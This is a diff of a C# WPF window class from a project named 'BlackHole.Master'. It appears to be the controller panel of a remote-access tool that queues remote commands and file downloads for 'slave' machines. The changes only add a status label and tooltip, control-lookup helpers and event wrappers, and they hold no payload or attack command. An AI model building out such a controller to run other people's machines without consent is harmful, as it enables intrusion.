@@ -13,7 +13,7 @@ using System.Windows.Media;
 
 namespace BlackHole.Master
 {
-    public class SlaveWindow : Window, IEventListener<SlaveEvent, Slave>
+    public abstract class SlaveWindow : Window, IEventListener<SlaveEvent, Slave>
     {
         /// <summary>
         /// 
@@ -45,19 +45,121 @@ namespace BlackHole.Master
         /// <summary>
         /// 
         /// </summary>
+        protected Label TargetStatus;
+
+        /// <summary>
+        /// 
+        /// </summary>
+        protected ToolTip TargetStatusTooltip;
+
+        /// <summary>
+        /// 
+        /// </summary>
+        protected TextBlock TargetStatusTooltipTitle;
+
+        /// <summary>
+        /// 
+        /// </summary>
+        protected TextBlock TargetStatusTooltipMessage;
+
+        /// <summary>
+        /// 
+        /// </summary>
         /// <param name="slave"></param>
-        public SlaveWindow(Slave slave) : this()
+        public SlaveWindow(Slave slave)
         {
             Slave = slave;
             m_pendingCommands = new Queue<IRemoteCommand>();
-            ViewModelCommands = new ViewModelCollection<IRemoteCommand>();            
+            ViewModelCommands = new ViewModelCollection<IRemoteCommand>();
         }
 
         /// <summary>
         /// 
         /// </summary>
-        public SlaveWindow()
+        public SlaveWindow() { }
+        
+        /// <summary>
+        /// 
+        /// </summary>
+        public override void OnApplyTemplate()
         {
+            base.OnApplyTemplate();
+            FindControl<ContentPresenter>("TargetStatusPresenter", (parent) =>
+            {
+                SetContentChildContext(parent, "TargetStatusBar", Slave);
+
+                ExecuteForContentChild<Label>(parent, "TargetStatus", (lbl) => TargetStatus = lbl);
+                ExecuteForContentChild<ToolTip>(parent, "TargetStatusTooltip", (tooltip) => TargetStatusTooltip = tooltip);
+                ExecuteForContentChild<TextBlock>(parent, "TargetStatusTooltipTitle", (txtBlock) => TargetStatusTooltipTitle = txtBlock);
+                ExecuteForContentChild<TextBlock>(parent, "TargetStatusTooltipMessage", (txtBlock) => TargetStatusTooltipMessage = txtBlock);
+            });
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <typeparam name="T"></typeparam>
+        /// <param name="controlName"></param>
+        /// <returns></returns>
+        protected void FindControl<T>(string controlName, Action<T> callback) where T : FrameworkElement
+        {
+            var control = FindName(controlName) as T;
+            if (control != null)
+                callback(control);
+        }
+
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <typeparam name="T"></typeparam>
+        protected void SetContentChildContext(ContentPresenter parent, string objectName, object context)
+            => ExecuteForContentChild<FrameworkElement>(parent, objectName, (content) => content.DataContext = context);
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="objectName"></param>
+        /// <param name="context"></param>
+        protected void ExecuteForContentChild<T>(ContentPresenter parent, string objectName, Action<T> callback)
+            where T : FrameworkElement
+        {
+            parent.ApplyTemplate();
+            var obj = parent.ContentTemplate.FindName(objectName, parent) as T;
+            if (obj != null)
+                callback(obj);
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <typeparam name="T"></typeparam>
+        /// <param name="parent"></param>
+        /// <param name="childName"></param>
+        /// <returns></returns>
+        protected T FindElementByName<T>(FrameworkElement parent, string childName) where T : FrameworkElement
+        {
+            T childElement = null;
+            var childCount = VisualTreeHelper.GetChildrenCount(parent);
+            for (int i = 0; i < childCount; i++)
+            {
+                var child = VisualTreeHelper.GetChild(parent, i) as FrameworkElement;
+
+                if (child == null)
+                    continue;
+
+                if (child is T && child.Name.Equals(childName))
+                {
+                    childElement = (T)child;
+                    break;
+                }
+
+                childElement = FindElementByName<T>(child, childName);
+
+                if (childElement != null)
+                    break;
+            }
+            return childElement;
         }
 
         /// <summary>
@@ -82,7 +184,7 @@ namespace BlackHole.Master
         protected void AddCommand(IRemoteCommand command)
         {
             m_pendingCommands.Enqueue(command);
-            ViewModelCommands.Items.Add(command);
+            ViewModelCommands.AddItem(command);
             ExecuteNextCommandIfPossible();
         }
 
@@ -95,7 +197,7 @@ namespace BlackHole.Master
             // we delay the remove so we see small file downloads, otherwise it would be dropped instantly (download too fast)
             Dispatcher.DelayInvoke(TimeSpan.FromMilliseconds(2000), () =>
             {
-                ViewModelCommands.Items.Remove(temp);
+                ViewModelCommands.RemoveItem(temp);
             });
             m_currentCommand = null;
             ExecuteNextCommandIfPossible();
@@ -163,7 +265,7 @@ namespace BlackHole.Master
         protected void CancelCommand(long id)
         {
             if (!IsCommandCancelled(id))
-                ViewModelCommands.Items.Remove(ViewModelCommands.Items.First(command => command.Id == id));
+                ViewModelCommands.RemoveItem(ViewModelCommands.Items.First(command => command.Id == id));
         }
 
         /// <summary>
@@ -199,13 +301,21 @@ namespace BlackHole.Master
         /// <param name="success"></param>
         /// <param name="message"></param>
         protected void FireFakeStatus(long operationId, string operation, bool success, string message) =>
-            Slave.SlaveEvents.PostEvent(new SlaveEvent(SlaveEventType.INCOMMING_MESSAGE, Slave, new StatusUpdateMessage()
+            FireSlaveEvent(SlaveEventType.INCOMMING_MESSAGE, new StatusUpdateMessage()
             {
                 OperationId = operationId,
                 Operation = operation,
                 Message = message,
                 Success = success
-            }));
+            });
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="type"></param>
+        /// <param name="data"></param>
+        protected void FireSlaveEvent(SlaveEventType type, object data) =>
+            Slave.SlaveEvents.PostEvent(new SlaveEvent(type, Slave, data));
 
         /// <summary>
         /// 
@@ -223,6 +333,13 @@ namespace BlackHole.Master
                             .Match()
                             .With<StatusUpdateMessage>(m =>
                             {
+                                TargetStatus.Content = m.Operation;
+                                TargetStatusTooltipTitle.Text = m.Operation;
+                                TargetStatusTooltipMessage.Text = m.Message;
+                                TargetStatus.Foreground = m.Success ? Brushes.DarkGreen : Brushes.Red;
+                                TargetStatusTooltip.PlacementTarget = TargetStatus;
+                                TargetStatusTooltip.IsOpen = true;
+
                                 if ((m_currentCommand != null) && (m.OperationId == m_currentCommand.Id) && !m.Success)
                                 {
                                     m_currentCommand.ProgressColor = Brushes.DarkRed;
